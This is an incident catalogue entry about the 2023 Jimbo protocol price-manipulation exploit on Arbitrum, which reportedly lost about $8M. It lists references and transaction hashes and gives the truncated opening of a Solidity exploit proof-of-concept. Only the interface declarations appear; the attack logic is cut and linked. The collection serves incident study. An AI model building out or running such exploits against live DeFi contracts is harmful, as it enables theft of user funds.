# [?] Jimbo - Protocol Specific Price Manipulation

## Summary
Severity: Unknown
Chain: Arbitrum
Component: Jimbo
Published: 2023-05-29
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-05/Jimbo_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~$8M
References:
- https://twitter.com/cryptofishx/status/1662888991446941697
- https://docs.jimbosprotocol.xyz/protocol/liquidity-rebalancing-scenarios
- https://twitter.com/yicunhui2/status/1663793958781353985
- https://arbiscan.io/tx/0xf9baf8cee8973cf9700ae1b1f41c625d7a2abdbcbc222582d24a8f2f790d0b5a

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @Analysis
// https://twitter.com/cryptofishx/status/1662888991446941697
// https://docs.jimbosprotocol.xyz/protocol/liquidity-rebalancing-scenarios
// https://twitter.com/yicunhui2/status/1663793958781353985
// @TX
// https://arbiscan.io/tx/0xf9baf8cee8973cf9700ae1b1f41c625d7a2abdbcbc222582d24a8f2f790d0b5a
// https://arbiscan.io/tx/0xfda5464e97043a2d0093cbed6d0a64f6a86049f5e9608c014396a7390188670e
// https://arbiscan.io/tx/0x3c6e053faecd331883641c1d23c9d9d37d065e4f9c4086e94a3c34bf8702618a
// https://arbiscan.io/tx/0x44a0f5650a038ab522087c02f734b80e6c748afb207995e757ed67ca037a5eda
// @Summary
// Protocol-specific price manipulation

interface IJimboController {
    function shift() external;
    function reset() external;
    function anchorBin() external view returns (uint24);
    function triggerBin() external view returns (uint24);
}

interface ILBPair {
    function getActiveId() external view returns (uint24 activeId);

    function getBin(
        uint24 id
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-05/Jimbo_exp.sol_
